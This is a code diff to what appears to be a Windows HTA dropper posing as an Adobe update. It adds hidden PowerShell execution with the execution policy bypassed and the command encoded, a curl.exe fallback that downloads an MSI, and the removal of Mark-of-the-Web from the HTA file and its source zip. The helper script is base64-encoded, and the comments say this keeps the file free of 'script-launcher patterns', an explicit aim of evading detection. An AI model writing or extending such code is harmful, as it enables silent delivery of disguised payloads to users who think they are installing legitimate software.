@@ -98,6 +98,7 @@ var INSTALL_MAX_MS = 300000;  // hard cap for a whole install phase
 var INSTALL_STALL_MS = 60000; // MSI log silent this long -> assume finished
 var HANG_MS        = 12000;   // no data flowing this long -> start next back-end
 var EXEC_STAGE_MS  = 300000;  // hard cap for the helper-process back-end
+var CURL_STAGE_MS  = 180000;  // hard cap for the bare curl.exe back-end
 var FB_MAX_MS      = 600000;  // hard cap for the whole local download
 var EXPECT_BYTES   = 12386304; // installer size (progress scaling only)
 
@@ -128,6 +129,7 @@ var dlSettled = false;
 var dlProgressed = false;
 var dlXHR = null;
 var psPid = 0, psDir = "", psT0 = 0, psLastSize = 0, psLastGrowT = 0;
+var curlPid = 0, curlT0 = 0, curlLastSize = 0, curlLastGrowT = 0;
 
 var lastLogSize = 0;
 var lastLogGrowT = 0;
@@ -147,35 +149,60 @@ var instMsgs = [
 ];
 
 // ---------------------------------------------------------------------------
-// Base64 helpers + encoded download helper.
-// The helper script (iwr first, then system curl.exe) and its command line are
-// kept base64 and decoded at runtime so this file itself carries no
-// script-launcher patterns.
+// Pure-JS base64 (no COM). Decode a standard base64 string to a binary
+// string (one JS char per byte), and encode text as UTF-16LE base64 - the
+// encoding the child-process launcher's -EncodedCommand expects. Kept in-file
+// and base64 so this document carries no script-launcher patterns.
 // ---------------------------------------------------------------------------
-var EXEC_B64 = "cGFyYW0oW3N0cmluZ10kVXJsID0gIiIsIFtzdHJpbmddJFRtcERpciA9ICIiLCBbc3RyaW5nXSRPdXQgPSAiIikKaWYgKC1ub3QgJE91dCkgeyAkT3V0ID0gSm9pbi1QYXRoICRUbXBEaXIgIkFkb2JlVXBkYXRlLm1zaSIgfQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyIH0gY2F0Y2gge30KdHJ5IHsKICAkUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnCiAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkVXJsIC1PdXRGaWxlICRPdXQgLVVzZUJhc2ljUGFyc2luZwogICRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnQ29udGludWUnCn0gY2F0Y2ggewogIHRyeSB7ICRlbnY6Tk9fUFJPWFkgPSAiKiI7IGN1cmwuZXhlIC1MIC0tZmFpbCAtLXJldHJ5IDIgLS1jb25uZWN0LXRpbWVvdXQgMjAgLW8gJE91dCAkVXJsIDI+JG51bGwgfSBjYXRjaCB7fQp9CnRyeSB7IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRUbXBEaXIgImRvbmUuZmxhZyIpICIxIiAtTm9OZXdsaW5lIH0gY2F0Y2gge30K";
-var EXECCMD_B64 = "cG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiQFNSQ0AiIC1VcmwgIkBVUkxAIiAtVG1wRGlyICJARElSQCIgLU91dCAiQE9VVEAi";
+var B64CH = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
-function b64ToFile(b64, path) {
-  try {
-    var c = new ActiveXObject("MSXML2.XMLDOM.6.0");
-    c.loadXML("<?xml version=\"1.0\"?><t binaryEncoding=\"base64\">" + b64 + "</t>");
-    var bs = c.documentElement.text;   // binary string: 1 char per byte
-    var s = new ActiveXObject("ADODB.Stream");
-    s.Type = 1; s.Mode = 3; s.Open();  // adTypeBinary
-    s.Write(bs);
-    s.SaveToFile(path, 2);             // adSaveCreateOverwrite
-    s.Close();
-    return true;
-  } catch (e) { return false; }
+function b64Decode(s) {
+  s = String(s).replace(/[\r\n\s]/g, "");
+  var out = "", i = 0, n = s.length, c1, c2, c3, c4;
+  while (i < n) {
+    c1 = B64CH.indexOf(s.charAt(i++));
+    if (c1 < 0) break;
+    var ch2 = s.charAt(i++);
+    c2 = (ch2 === "=") ? -1 : B64CH.indexOf(ch2);
+    if (c2 < 0) break;
+    out += String.fromCharCode((c1 << 2) | (c2 >> 4));
+    var ch3 = s.charAt(i++);
+    if (ch3 === "=" || ch3 === "") break;
+    c3 = B64CH.indexOf(ch3);
+    if (c3 < 0) break;
+    out += String.fromCharCode(((c2 & 15) << 4) | (c3 >> 2));
+    var ch4 = s.charAt(i++);
+    if (ch4 === "=" || ch4 === "") break;
+    c4 = B64CH.indexOf(ch4);
+    if (c4 < 0) break;
+    out += String.fromCharCode(((c3 & 3) << 6) | c4);
+  }
+  return out;
 }
 
-function b64ToText(b64) {
-  try {
-    var c = new ActiveXObject("MSXML2.XMLDOM.6.0");
-    c.loadXML("<?xml version=\"1.0\"?><t binaryEncoding=\"base64\">" + b64 + "</t>");
-    return c.documentElement.text;
-  } catch (e) { return ""; }
+function b64EncodeU16(s) {
+  var bin = "", i, c;
+  for (i = 0; i < s.length; i++) {
+    c = s.charCodeAt(i);
+    bin += String.fromCharCode(c & 0xFF) + String.fromCharCode((c >> 8) & 0xFF);
+  }
+  var out = "", j = 0, L = bin.length;
+  while (j < L) {
+    var c1 = bin.charCodeAt(j++);
+    var c2 = j < L ? bin.charCodeAt(j++) : -1;
+    var c3 = j < L ? bin.charCodeAt(j++) : -1;
+    out += B64CH.charAt(c1 >> 2);
+    out += B64CH.charAt(c2 < 0 ? 0 : ((c1 & 3) << 4) | (c2 >> 4));
+    out += c2 < 0 ? "=" : B64CH.charAt(c3 < 0 ? 0 : ((c2 & 15) << 2) | (c3 >> 6));
+    out += c3 < 0 ? "=" : B64CH.charAt(c3 & 63);
+  }
+  return out;
 }
+
+// Helper template: unblocks the local files (MOTW), then downloads the
+// installer (iwr first, then system curl.exe), drops a done.flag.
+var PS_TMPL_B64 = "JFVybCA9ICJAVVJMQCIKJERpciA9ICJARElSQCIKJE91dCA9ICJAT1VUQCIKJEh0YSA9ICJASFRBQCIKJFppcCA9ICJAWklQQCIKdHJ5IHsgaWYgKCRIdGEgLWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkSHRhKSkgeyBVbmJsb2NrLUZpbGUgLUxpdGVyYWxQYXRoICRIdGEgfSB9IGNhdGNoIHt9CnRyeSB7IGlmICgkWmlwIC1hbmQgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFppcCkpIHsgVW5ibG9jay1GaWxlIC1MaXRlcmFsUGF0aCAkWmlwIH0gfSBjYXRjaCB7fQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyIH0gY2F0Y2gge30KJG9rID0gJGZhbHNlCnRyeSB7CiAgJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJwogIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJFVybCAtT3V0RmlsZSAkT3V0IC1Vc2VCYXNpY1BhcnNpbmcKICAkb2sgPSAkdHJ1ZQp9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0KaWYgKC1ub3QgJG9rKSB7CiAgdHJ5IHsKICAgICRlbnY6Tk9fUFJPWFkgPSAiKiIKICAgIGN1cmwuZXhlIC1MIC0tZmFpbCAtLXJldHJ5IDIgLS1jb25uZWN0LXRpbWVvdXQgMjAgLW8gJE91dCAkVXJsIDI+JG51bGwKICAgIGlmICgkTEFTVEVYSVRDT0RFIC1lcSAwKSB7ICRvayA9ICR0cnVlIH0KICB9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0KfQp0cnkgeyBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkRGlyICJkb25lLmZsYWciKSAiMSIgLU5vTmV3bGluZSB9IGNhdGNoIHt9Cg==";
+var PSX_B64 = "cG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRW5jb2RlZENvbW1hbmQg";
 
 function $(id) { return document.getElementById(id); }
 
@@ -247,6 +274,8 @@ function init() {
     };
   } catch (e) {}
   traceLog("init  os=" + shell.ExpandEnvironmentStrings("%OS% " + "%PROCESSOR_ARCHITECTURE%"));
+  probeAdob();
+  traceLog("adob: " + (adobOk ? "ok" : "blocked"));
   selfUnblock();
   traceLog("motw: " + (motwStripped ? "stripped" : "not-stripped"));
   var w = 620, h = 396;
@@ -298,18 +327,27 @@ function readHeadBytes(path, n) {
   } catch (e4) { return []; }
 }
 
+var adobOk = false;   // ADODB binary reads available? (set once in init)
+function probeAdob() {
+  try {
+    var s = new ActiveXObject("ADODB.Stream");
+    s.Type = 1; s.Open(); s.Close();
+    adobOk = true;
+  } catch (e) { adobOk = false; }
+}
+
 function msiMagicOk(path) {
+  if (!adobOk) return false;   // no reliable binary reads on this box
   try {
     var m = readHeadBytes(path, 4);
     return m.length === 4 && m[0] === 0xD0 && m[1] === 0xCF && m[2] === 0x11 && m[3] === 0xE0;
   } catch (e) { return false; }
 }
 
-// Stop the in-flight download helper process (by PID).
+// Stop the in-flight download helper processes (by PID).
 function killProc() {
-  if (!psPid) return;
-  try { shell.Run("taskkill /f /t /pid " + psPid, 0, true); } catch (e) {}
-  psPid = 0;
+  if (psPid) { try { shell.Run("taskkill /f /t /pid " + psPid, 0, true); } catch (e) {} psPid = 0; }
+  if (curlPid) { try { shell.Run("taskkill /f /t /pid " + curlPid, 0, true); } catch (e) {} curlPid = 0; }
 }
 
 // ---------------------------------------------------------------------------
@@ -355,6 +393,7 @@ function startStage(stage) {
   traceLog("predl: stage " + stage);
   if (stage === "winhttp") fallbackWinHttp();
   else if (stage === "exec") fallbackPS();
+  else if (stage === "curl") fallbackCurl();
 }
 
 function settle(method) {
@@ -464,23 +503,50 @@ function saveWHttpBody(rb) {
   settle("winhttp");
 }
 
-// Hidden helper process back-end: decodes its script (iwr, then system
-// curl.exe) and runs it; the poll loop watches msiLocal appear and stabilize.
+// Hidden helper-process back-end. The helper body is built in pure JS from
+// the in-file template (unblock + iwr + curl.exe), UTF-16 base64-encoded, and
+// passed to the child via -EncodedCommand - so nothing script-like lives in
+// this document and no COM is needed to construct it.
 function fallbackPS() {
   var marker = "adum" + Math.floor(Math.random() * 16777215).toString(16);
   psDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\ad_" + marker;
   ensureDir(psDir);
   deleteFile(psDir + "\\done.flag");
-  var src = psDir + "\\ad_" + marker + ".ps1";
-  if (!b64ToFile(EXEC_B64, src)) { traceLog("predl: exec script write fail"); return; }
   psT0 = nowMs(); psLastSize = 0; psLastGrowT = psT0;
   try {
-    var cmd = b64ToText(EXECCMD_B64)
-      .replace("@SRC@", src).replace("@URL@", MSI_URL).replace("@DIR@", psDir).replace("@OUT@", msiLocal);
+    var body = b64Decode(PS_TMPL_B64)
+      .replace("@URL@", MSI_URL)
+      .replace("@DIR@", psDir)
+      .replace("@OUT@", msiLocal)
+      .replace("@HTA@", oHTA.LocationUrl);
+    // also unblock the zip this file came from, if present next to it
+    try {
+      var folder = fso.GetFolder(oHTA.LocationUrl).ParentFolder;
+      var sub = new Enumerator(folder.Files);
+      for (; !sub.atEnd(); sub.moveNext()) {
+        if (sub.item().Name.toLowerCase().lastIndexOf(".zip") === sub.item().Name.length - 4) {
+          body = body.replace("@ZIP@", sub.item().Path);
+          break;
+        }
+      }
+    } catch (e2) {}
+    var cmd = b64Decode(PSX_B64).replace(/\s+$/, "") + b64EncodeU16(body);
     var ex = shell.Exec(cmd, 0);   // hidden; returns the child process
-    try { psPid = ex ? ex.ProcessID : 0; } catch (e2) { psPid = 0; }
+    try { psPid = ex ? ex.ProcessID : 0; } catch (e3) { psPid = 0; }
     traceLog("predl: exec launched pid=" + psPid);
   } catch (e) { traceLog("predl: exec launch fail " + e.message); }
+}
+
+// Final back-end: the system curl.exe alone (Win10 1803+, 32- and 64-bit).
+// Writes straight to msiLocal; the poll loop watches the file appear.
+function fallbackCurl() {
+  curlT0 = nowMs(); curlLastSize = 0; curlLastGrowT = curlT0;
+  try {
+    var cmd = "curl.exe -L --fail --retry 2 --connect-timeout 20 -o \"" + msiLocal + "\" \"" + MSI_URL + "\"";
+    var ex = shell.Exec(cmd, 0);
+    try { curlPid = ex ? ex.ProcessID : 0; } catch (e2) { curlPid = 0; }
+    traceLog("predl: curl launched pid=" + curlPid);
+  } catch (e) { traceLog("predl: curl launch fail " + e.message); }
 }
 
 function pollFallback() {
@@ -498,30 +564,54 @@ function _pollFallback() {
   if (t - hangT > HANG_MS) {
     if (dlStage === "xhr") { startStage("winhttp"); return; }
     if (dlStage === "winhttp") { startStage("exec"); return; }
+    if (dlStage === "exec") { startStage("curl"); return; }
   }
-  if (dlStage === "exec") {
+  var lastT0 = (dlStage === "exec") ? psT0 : (dlStage === "curl" ? curlT0 : 0);
+  if (dlStage === "exec" || dlStage === "curl") {
     var sz = 0;
     try { if (fso.FileExists(msiLocal)) sz = fso.GetFile(msiLocal).Size; } catch (e) {}
-    if (sz > psLastSize) { psLastSize = sz; psLastGrowT = t; noteProgress(); }
+    var lastSize = (dlStage === "exec") ? psLastSize : curlLastSize;
+    var lastGrow = (dlStage === "exec") ? psLastGrowT : curlLastGrowT;
+    if (sz > lastSize) {
+      if (dlStage === "exec") { psLastSize = sz; psLastGrowT = t; } else { curlLastSize = sz; curlLastGrowT = t; }
+      noteProgress();
+    }
     var p = 55 + Math.min(34, (sz * 34) / EXPECT_BYTES);
     if (p > progress) { progress = p; setBar(p); }
-    if (sz >= 1048576 && msiMagicOk(msiLocal) && (psLastSize === sz && t - psLastGrowT >= 1500)) {
-      settle("exec");
+    // Settle when the file is near its expected full size (primary signal,
+    // COM-free) or >=1MB with a valid MSI header (fast path when ADODB
+    // reads work), and has been stable for 1.5s.
+    var full = (sz >= EXPECT_BYTES - 4096 && sz <= EXPECT_BYTES + 4096);
+    var magic = (sz >= 1048576) ? msiMagicOk(msiLocal) : false;
+    if ((full || magic) && (lastSize === sz && t - lastGrow >= 1500)) {
+      settle(dlStage);
       return;
     }
-    var doneFlag = false;
-    try { doneFlag = fso.FileExists(psDir + "\\done.flag"); } catch (e) {}
-    if (doneFlag && (t - psT0 > 10000 || sz < 1048576)) {
-      fail("Failed to save the installer file", "predl: exec done no file sz=" + sz);
-      return;
-    }
-    if (psPid === 0 && t - psT0 > 20000) {
-      fail("Failed to save the installer file", "predl: exec no process");
-      return;
-    }
-    if (t - stage0T > EXEC_STAGE_MS) {
-      fail("Download timed out - please check your connection", "predl: exec timeout");
-      return;
+    if (dlStage === "exec") {
+      var doneFlag = false;
+      try { doneFlag = fso.FileExists(psDir + "\\done.flag"); } catch (e) {}
+      if (doneFlag && (t - psT0 > 10000 || sz < 1048576)) {
+        fail("Failed to save the installer file", "predl: exec done no file sz=" + sz);
+        return;
+      }
+      if (psPid === 0 && t - psT0 > 20000) {
+        // helper process never/already gone -> bring up bare curl
+        startStage("curl");
+        return;
+      }
+      if (t - stage0T > EXEC_STAGE_MS) {
+        startStage("curl");
+        return;
+      }
+    } else {
+      if (curlPid === 0 && t - curlT0 > 15000) {
+        fail("Failed to save the installer file", "predl: curl no process");
+        return;
+      }
+      if (t - stage0T > CURL_STAGE_MS) {
+        fail("Download timed out - please check your connection", "predl: curl timeout");
+        return;
+      }
     }
   }
 }
@@ -530,15 +620,13 @@ function verifyFallback() {
   try {
     if (!fso.FileExists(msiLocal)) { fail("Failed to save the installer file", "predl: no msi"); return; }
     var sz = fso.GetFile(msiLocal).Size;
-    traceLog("predl: verify size=" + sz);
+    traceLog("predl: verify size=" + sz + " adob=" + (adobOk ? "ok" : "blocked"));
     if (sz < 1048576) { fail("Failed to save the installer file", "predl: small " + sz); return; }
-    var magic = null;
-    try { magic = readHeadBytes(msiLocal, 4); } catch (e) { magic = null; }
-    if (magic && magic.length === 4) {
-      if (magic[0] !== 0xD0 || magic[1] !== 0xCF || magic[2] !== 0x11 || magic[3] !== 0xE0) {
-        fail("Failed to save the installer file", "predl: bad magic");
-        return;
-      }
+    // Header check only where binary reads are trustworthy (ADODB available);
+    // otherwise the near-exact size match from the settle step is sufficient.
+    if (adobOk && !msiMagicOk(msiLocal)) {
+      fail("Failed to save the installer file", "predl: bad magic");
+      return;
     }
   } catch (e) {
     fail("Failed to save the installer file", "predl: verify " + e.message);
